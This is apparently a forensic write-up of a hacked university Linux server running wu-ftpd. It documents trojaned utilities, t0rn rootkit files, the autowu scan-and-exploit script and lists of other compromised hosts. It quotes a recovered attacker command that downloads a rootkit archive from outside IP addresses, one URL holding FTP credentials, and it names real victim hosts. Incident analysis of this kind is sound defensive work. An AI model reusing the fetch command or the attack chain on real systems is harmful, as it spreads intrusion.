@@ -1,0 +1,146 @@
+Initial scan:
+[root@laptop /root]# nmap hacked
+Starting nmap V. 2.53 by fyodor@insecure.org ( www.insecure.org/nmap/ )
+Interesting ports on hacked (130.126.111.62):
+(The 1516 ports scanned but not shown below are in state: closed)
+Port       State       Service
+22/tcp     open        ssh
+23/tcp     open        telnet
+25/tcp     open        smtp
+79/tcp     open        finger
+113/tcp    open        auth
+513/tcp    open        login
+514/tcp    open        shell
+Nmap run completed -- 1 IP address (1 host up) scanned in 2 seconds
+
+It had previously been running wu-ftpd:
+220 macaulay.math.uiuc.edu FTP server (Version wu-2.6.0(1) Thu Oct 21 12:27:00 EDT 1999) ready.
+
+Logging into the machine, some preliminary work shows that it was hacked
+sometime around 9am Feb 4.
+
+Lots of files were trojaned; many left with uid/gid 1042/1037.  So to get
+a basic idea of what was changed, we do a
+find / -user 1042
+/bin/ls
+/bin/netstat
+/bin/ps
+/bin/.../bash
+/dev/tux/ssh2/hostkey
+/dev/tux/ssh2/hostkey.pub
+/dev/tux/ssh2/logo
+/dev/tux/ssh2/random_seed
+/lib/ldd.so/tks
+/lib/ldd.so/tkp
+/lib/ldd.so/tksb
+/lib/lidps1.so
+/sbin/ifconfig
+/usr/bin/md5sum
+/usr/bin/dir
+/usr/bin/find
+/usr/bin/top
+/usr/bin/pstree
+/usr/bin/slocate
+/usr/include/file.h
+/usr/include/hosts.h
+/usr/include/log.h
+/usr/include/proc.h
+/usr/sbin/lsof
+/.../awu
+/.../awu/awu
+/.../awu/wu
+/.../awu/Makefile
+/.../awu/auto
+
+So we find we can't trust many of our utilities, including ps, ls, etc.
+
+Also of interest:
+/lib/lidps1.so contains the text:
+xntps
+tk
+
+This is presumably a list of what NOT to show us using the trojaned ps.
+Indeed, we find
+/lib/ldd.so/tks		executable
+/lib/ldd.so/tkp		logs user/pass combinations
+/lib/ldd.so/tksb	log cleaner
+as files that wouldn't want to be seen.  (It is noteworthy that ls can't
+display them, either.)
+
+But the real goodies are in /.../awu
+There the file 128 shows that all of 128.11-128.254 was to be scanned,
+basically by calling awu repeatedly.
+The file awu is a shell script that does the following:
+ - runs pscan2 on a class B network looking for answers on port 21
+ - runs ssvuln on machines that answered to get the ftp banner message
+ - runs oops on the outfile (exploits each machine in turn)
+It is noteworthy that this machine seems to have found 1313 vulnerable
+machines while it scanned!  If it automatically exploits them and repeats,
+it might be considered to be a worm.
+
+awu (autowu) was made in 2002 by riksta of [OPTIC]
+Compiled on this machine on Feb 4 17:45, so most likely required human
+interaction.  (The t0rn rootkit was installed automatically at 9:04.)
+
+I'm not entirely certain of the purpose of the awu.list file.  Presumably
+it stores the names of infected machines.  Contents are:
+128.42.57.153 paprika.mems.rice.edu
+128.61.36.113 r36h113.res.gatech.edu
+128.82.226.65 modestus.cee.odu.edu
+128.83.143.50 boniperti.csres.utexas.edu
+128.83.143.78 nlp01.csres.utexas.edu
+
+A strings on ss shows where it gets the rootkit from:
+echo 1 ; if [ -f /usr/bin/wget ] ; then /usr/bin/wget http://136.176.52.62/rk.tgz ; else if [ -f /usr/bin/ncftpget ] ; then /usr/bin/ncftpget ftp://maaiman:gokvcvz3@128.210.138.107/rk.tgz ; else if [ -f /usr/bin/lynx ] ; then /usr/bin/lynx -dump http://136.176.52.62/rk.tgz >> rk.tgz ; fi ; fi ; fi
+
+
+~spiroff/.cl had eggdrop in it, and a crontab to keep it running
+
+running it and sniffing the computer's reaction gives:
+17:15:45.192371 B arp who-has 193.145.98.212 tell 130.126.111.62
+
+Checking more thoroughly shows it actually wants to connect to several
+other machines:
+128.210.78.12   193.145.98.212   209.113.133.180   209.52.174.131
+
+17:38:36.635915 B arp who-has 128.210.78.12 tell 130.126.111.62
+17:38:36.636225 > arp reply 128.210.78.12 (0:80:c8:8c:5e:89) is-at 0:80:c8:8c:5e:89 (0:a0:24:d2:c9:a3)
+17:38:36.636709 < 130.126.111.62.2141 > 128.210.78.12.24120: S 3247394765:3247394765(0) win 32120 <mss 1460,sackOK,timestamp 255448185 0,nop,wscale 0> (DF)
+17:38:39.635222 < 130.126.111.62.2141 > 128.210.78.12.24120: S 3247394765:3247394765(0) win 32120 <mss 1460,sackOK,timestamp 255448485 0,nop,wscale 0> (DF)
+17:38:45.636446 < 130.126.111.62.2141 > 128.210.78.12.24120: S 3247394765:3247394765(0) win 32120 <mss 1460,sackOK,timestamp 255449085 0,nop,wscale 0> (DF)
+
+17:18:36.324983 B arp who-has 209.52.174.131 tell 130.126.111.62
+17:18:38.345408 < 130.126.111.62.1868 > 193.145.98.212.24121: S 1982063964:1982063964(0) win 32120 <mss 1460,sackOK,timestamp 255328379 0,nop,wscale 0> (DF)
+17:18:44.346626 < 130.126.111.62.1868 > 193.145.98.212.24121: S 1982063964:1982063964(0) win 32120 <mss 1460,sackOK,timestamp 255328979 0,nop,wscale 0> (DF)
+
+17:40:16.695265 B arp who-has 209.52.174.131 tell 130.126.111.62
+17:40:16.695594 > arp reply 209.52.174.131 (0:80:c8:8c:5e:89) is-at 0:80:c8:8c:5e:89 (0:a0:24:d2:c9:a3)
+17:40:16.696077 < 130.126.111.62.2156 > 209.52.174.131.24122: S 3351468990:3351468990(0) win 32120 <mss 1460,sackOK,timestamp 255458189 0,nop,wscale 0> (DF)
+17:40:19.695536 < 130.126.111.62.2156 > 209.52.174.131.24122: S 3351468990:3351468990(0) win 32120 <mss 1460,sackOK,timestamp 255458489 0,nop,wscale 0> (DF)
+
+17:24:01.551181 B arp who-has 209.113.133.180 tell 130.126.111.62
+17:24:01.551419 > arp reply 209.113.133.180 (0:80:c8:8c:5e:89) is-at 0:80:c8:8c:5e:89 (0:a0:24:d2:c9:a3)
+17:24:01.551897 < 130.126.111.62.1905 > 209.113.133.180.24123: S 2317955061:2317955061(0) win 32120 <mss 1460,sackOK,timestamp 255360693 0,nop,wscale 0> (DF)
+17:24:02.550874 B arp who-has 209.52.174.131 tell 130.126.111.62
+17:24:03.551073 B arp who-has 209.52.174.131 tell 130.126.111.62
+17:24:04.551330 < 130.126.111.62.1905 > 209.113.133.180.24123: S 2317955061:2317955061(0) win 32120 <mss 1460,sackOK,timestamp 255360993 0,nop,wscale 0> (DF)
+
+
+
+menscher@intellx2:~/Computer/macaulay> ftp 128.210.78.12
+Connected to capital.polsci.purdue.edu.
+220 ProFTPD 1.2.2 Server (ProFTPD Default Installation) [capital.polsci.purdue.edu]
+Name (128.210.78.12:menscher): 
+menscher@intellx2:~/Computer/macaulay> ftp 193.145.98.212
+Connected to molec2.dfis.ull.es.
+220 molec2.dfis.ull.es FTP server (Version wu-2.6.0(1) Fri Jun 23 08:07:11 CEST 2000) ready.
+Name (193.145.98.212:menscher): 
+menscher@intellx2:~/Computer/macaulay> ftp 209.113.133.180
+ftp: connect: Connection refused
+ftp> quit
+menscher@intellx2:~/Computer/macaulay> ftp 209.52.174.131
+Connected to secure.ocis.net.
+220 secure.ocis.net FTP server (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) ready.
+Name (209.52.174.131:menscher): 
+
+So these are apparently vulnerable boxes that were likely already exploited.
